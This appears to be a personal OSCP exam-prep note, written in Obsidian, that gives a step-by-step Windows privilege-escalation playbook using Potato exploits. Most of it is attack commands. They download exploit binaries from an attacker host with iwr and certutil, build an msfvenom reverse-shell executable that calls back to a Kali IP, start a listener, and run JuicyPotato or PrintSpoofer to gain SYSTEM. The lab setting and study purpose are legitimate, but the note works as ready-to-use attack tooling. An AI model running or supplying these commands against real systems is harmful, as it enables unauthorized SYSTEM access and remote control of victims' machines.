## Step 1: Verify Your Architecture & OS Version

Before dropping a payload, you need to know whether the target is 32-bit or 64-bit, and roughly how old it is, so you pick the right exploit binary.

Run these two commands in your shell:

```powershell
powershell [Environment]::Is64BitOperatingSystem
```

CMD

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

```
wmic os get osarchitecture
```
## Step 2: Choose Your Exploit Tool

Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:

### Option A: Modern Windows (Windows 10/11, Server 2016/2019/2022)

- **Tool:** **`PrintSpoofer.exe`** or **`GodPotato.exe`**
    
- **Why:** Older potato exploits rely on the NTLM authentication provider against the BITS service, which Microsoft patched. `PrintSpoofer` leverages the Print Spooler service via named pipes, which is highly reliable on modern operating systems.
    

### Option B: Legacy Windows (Windows 7/8, Server 2008/2012)

- **Tool:** **`JuicyPotato.exe`** or **`SweetPotato.exe`**
    
- **Why:** These abuse the classic COM/RPC configuration vulnerabilities present in older Windows builds.
    

## Step 3: Transfer the Exploit to the Target

Use your Kali machine to host the binary, and pull it down via your active Windows shell using PowerShell's native file transfer capabilities.

```
 cd ~/Desktop/Tools && python3 -m http.server 80
```

POWERSHELL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = ` iwr -uri http://${KaliIP}/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
OR
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\Windows\Tasks\JuicyPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

## Step 4: Execute and Escalate

### If using PrintSpoofer:

`PrintSpoofer` is incredibly elegant because it can interactively elevate your existing shell without needing a separate listener.

Run the following command to instantly upgrade your session:

DOS

```
C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
```

- `-i` instructs the tool to interact with the current session.
    
- `-c cmd` specifies the command interpreter to launch.
    

### If using GodPotato / JuicyPotato:

If you are using a variation that requires triggering a reverse shell back to you, generate an unencoded payload or executable using `msfvenom` or a simple PowerShell one-liner, start a second Netcat listener on Kali, and run:

On PANE1
```
cd ~/Desktop/Tools && python3 penelope.py -p 9768 -O / --oscp-safe
```
ON PANE2 

(x32)
```
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe -O JuicyPotatox32.exe
```

 (x64)
```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

MSFVENOM

(x32)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/shell_reverse_tcp LHOST=${KaliIP} LPORT=9768 -f exe -o shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
(x64)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=9768 -f exe -o shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
python3 -m http.server 80
```

ON WINDOWS MACHINE

```
cd C:\Windows\Tasks
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/shell.exe C:\\\Windows\\\Tasks\\\shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Modify JuicyPotato or JuicyPotatox32.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\\\Windows\\\Tasks\\\JuicyPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Now you execute JuicyPotato. You must feed it the path to your payload (`-p`), a unique CLSID (a COM server ID string), and a local port to bound to (`-l`).

```
C:\Windows\Tasks\JuicyPotato.exe -t * -p C:\Windows\Tasks\shell.exe -l 9768 -c "{4991d34b-80a1-4291-83b6-3328366b9097}
```

## Step 5: Verify Your Sovereignty

If the exploit succeeds, your prompt will look exactly the same, but your privileges will have changed entirely. Type the following command to confirm your success:

DOS

```
whoami
```

> **Expected Output:** `nt authority\system`

You can now navigate straight to `C:\Users\Administrator\Desktop` to collect your flag.